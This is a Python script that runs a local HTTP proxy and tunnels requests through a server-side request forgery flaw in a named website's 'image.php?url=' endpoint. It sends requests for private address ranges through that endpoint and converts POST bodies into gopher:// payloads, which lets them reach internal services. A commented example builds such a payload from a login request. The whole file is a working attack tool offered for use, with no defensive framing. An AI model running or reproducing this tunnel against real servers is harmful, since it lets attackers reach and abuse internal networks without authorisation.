#coding=utf8
#!/usr/bin/env python3
#codeby 道长且阻
#email  664284092@QQ.COM
#date   201706261317

import socket
from urllib import parse
from threading import Thread
import requests

#配置ssrf访问的具体路径(%s)
SSRFURL = "http://www.suliu.net/image.php?url=%s"

#配置需要经过ssrf访问的域
HOSTS = ('127.0.0.1','192.168','172.16','10.')

class Request(object):
    def __init__(self,request):
        self.request    = request
        self.host       = ''
        self.port       = 80
        self.method     = 'GET'
        self.uri        = '/'
        self.protocol   = 'HTTP/1.1'
        self.headers    = {}
        self.url        = ''
        self.lenth      = 0
        self.data       = ''
        try:
            self.parse()
        except Exception as e:
            print(e)
        self.lenth      = len(self.data)

    def parse(self):
        head,self.data = self.request.split('\r\n\r\n')
        lines = head.split('\r\n')
        self.method,self.url,self.protocol = lines[0].split()
        self.method = self.method.upper()
        self.uri = '/'+'/'.join(self.url.split('/')[3:])
        for line in lines[1:]:
            head = line.split(':')
            self.headers[head[0]] = ':'.join(head[1:]).strip()
        host_port = self.headers['Host'].split(':')
        self.host = host_port[0]
        if len(host_port)==2:
            self.port = int(host_port[1])

    def gopher(self):
        req = self.request.replace(self.url,self.uri)# http://127.0.0.1/test => /test
        req = req.replace('%','%25')
        req = req.replace('\r\n','%0d%0a')
        return "gopher://%s:%s/_%s"%(self.host,self.port,req)

    def gopher1(self):
        '''简单模式'''
        return ("gopher://{0}:{1}/_{2} {3} {4}%0d%0a"
                "Host: {5}%0d%0a"
                "Content-Length: {6}%0d%0a"
                "Content-Type: {7}%0d%0a"
                "%0d%0a"
                "{8}").format(
                       self.host,self.port,self.method,self.uri,self.protocol,
                       self.host,
                       self.lenth,
                       self.headers['Content-Type'],
                       self.data)


class SsrfTunnel(Thread):
    def __init__(self,client):
        Thread.__init__(self)
        self.client = client

    def run(self):
        buff = self.client.recv(1024)
        req = Request(buff.decode())
        #print(req.request)
        print("REQ H-%s:P-%s"%(req.host,req.port))
        self.doproxy(req)

    def doproxy(self,req):
        try:
            if req.host.startswith(HOSTS):
                r = requests.get(
                    #url = SSRFURL % parse.quote(req.gopher()),
                    #因为gopher协议比较慢所以此处只针对POST请求用gopher协议
                    url = SSRFURL % parse.quote(req.url if req.method=='GET' else req.gopher()),
                    headers = req.headers,
                    proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'})
            else:
                 #不支持https
                r = getattr(requests,req.method.lower())(
                        url = req.url,
                        headers = req.headers,
                        data = req.data)
            self.client.sendall(r.content)
            print("REP Status-%s"%(r.status_code))
        except Exception as e:
            print(e)
        finally:
            self.client.close()

class HttpProxy(object):
    def __init__(self,host='127.0.0.1',port=8081,listen=100):
        self.host = host
        self.port = port
        self.listen   = listen
        self.clientsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.clientsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.clientsock.bind((self.host,self.port))

    def start(self):
        self.clientsock.listen(self.listen)
        print('Start HttpProxy Listen - %s:%s'%(self.host,self.port))
        while True:
            client,addr = self.clientsock.accept()
            SsrfTunnel(client).start()

c = HttpProxy()
c.start()

'''
aaa="""POST /web5/login.php HTTP/1.1
Host: 127.0.0.1
Cookie: userid=307064; PHPSESSID=89fc7qbjodlf93ml5a03mb01p0;
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

user[]=a&pass[]=b&submit=login"""
r=Request(aaa)
print(r.host)
print(r.gopher())
'''